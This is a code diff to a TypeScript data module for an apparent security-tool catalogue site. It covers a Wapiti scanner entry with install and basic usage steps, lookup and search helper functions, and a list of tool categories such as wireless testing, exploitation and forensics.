+        "Security auditing"
+      ],
+      features: [
+        "Multiple vulnerability types",
+        "Web application crawling",
+        "Various report formats",
+        "Modular attack system",
+        "Authentication support"
+      ],
+      installSteps: [
+        "Install Python 3: sudo apt install python3-pip",
+        "Install Wapiti: pip3 install wapiti3",
+        "Or install from package: sudo apt install wapiti",
+        "Test: wapiti --version"
+      ],
+      basicUsage: [
+        "Basic scan: wapiti -u [URL]",
+        "Specific modules: wapiti -u [URL] -m [modules]",
+        "Output format: wapiti -u [URL] -f [format] -o [file]",
+        "Scope control: wapiti -u [URL] --scope=[scope]"
       ]
     }
   ]
 };
 
-export const getCategoryData = (category: string) => {
-  const categoryInfo = {
-    "information-gathering": {
-      title: "Information Gathering",
-      description: "Network reconnaissance and target enumeration tools for cybersecurity professionals"
-    },
-    "wireless-hacking": {
-      title: "Wireless Hacking",
-      description: "WiFi security testing and wireless penetration tools"
-    },
-    "social-engineering": {
-      title: "Social Engineering",
-      description: "Phishing frameworks and social manipulation tools"
-    },
-    "exploitation": {
-      title: "Exploitation",
-      description: "Vulnerability exploitation and payload generation"
-    },
-    "password-cracking": {
-      title: "Password Cracking",
-      description: "Hash cracking and password recovery utilities"
-    },
-    "vulnerability-scanning": {
-      title: "Vulnerability Scanning",
-      description: "Automated security assessment and scanning tools"
-    },
-    "forensics": {
-      title: "Forensics",
-      description: "Digital forensics and incident response tools"
-    },
-    "web-assessment": {
-      title: "Web Assessment",
-      description: "Web application security testing frameworks"
-    }
-  };
-
-  return {
-    ...categoryInfo[category as keyof typeof categoryInfo],
-    tools: toolsData[category] || []
-  };
+export const getToolsByCategory = (category: string): Tool[] => {
+  const categoryKey = category.toLowerCase().replace(/\s+/g, '-');
+  return toolsData[categoryKey] || [];
 };
 
-export const getToolById = (toolId: string): Tool | null => {
-  for (const category in toolsData) {
-    const tool = toolsData[category].find(t => t.id === toolId);
+export const getToolById = (id: string): Tool | undefined => {
+  for (const category of Object.values(toolsData)) {
+    const tool = category.find(tool => tool.id === id);
     if (tool) return tool;
   }
-  return null;
+  return undefined;
 };
+
+export const getAllTools = (): Tool[] => {
+  return Object.values(toolsData).flat();
+};
+
+export const searchTools = (query: string): Tool[] => {
+  const allTools = getAllTools();
+  const lowercaseQuery = query.toLowerCase();
+  
+  return allTools.filter(tool => 
+    tool.name.toLowerCase().includes(lowercaseQuery) ||
+    tool.description.toLowerCase().includes(lowercaseQuery) ||
+    tool.category.toLowerCase().includes(lowercaseQuery)
+  );
+};
+
+export const categories = [
+  { 
+    name: "Information Gathering", 
+    description: "Tools for reconnaissance and intelligence gathering",
+    icon: "🔍",
+    count: getToolsByCategory("Information Gathering").length
+  },
+  { 
+    name: "Wireless Hacking", 
+    description: "WiFi and wireless network security tools",
+    icon: "📡",
+    count: getToolsByCategory("Wireless Hacking").length
+  },
+  { 
+    name: "Phishing & Social Engineering", 
+    description: "Social engineering and phishing simulation tools",
+    icon: "🎭",
+    count: getToolsByCategory("Phishing & Social Engineering").length
+  },
+  { 
+    name: "Exploitation", 
+    description: "Vulnerability exploitation and payload frameworks",
+    icon: "💥",
+    count: getToolsByCategory("Exploitation").length
+  },
+  { 
+    name: "Password Cracking", 
+    description: "Password recovery and authentication testing",
+    icon: "🔓",
+    count: getToolsByCategory("Password Cracking").length
+  },
+  { 
+    name: "Vulnerability Scanning", 
+    description: "Automated vulnerability detection and assessment",
+    icon: "🛡️",
+    count: getToolsByCategory("Vulnerability Scanning").length
+  },
+  { 
+    name: "Forensics", 
+    description: "Digital forensics and incident response tools",
+    icon: "🔬",
+    count: getToolsByCategory("Forensics").length
+  },
+  { 
+    name: "Web Application Assessment", 
+    description: "Web application security testing and analysis",
+    icon: "🌐",
+    count: getToolsByCategory("Web Application Assessment").length
+  }
+];
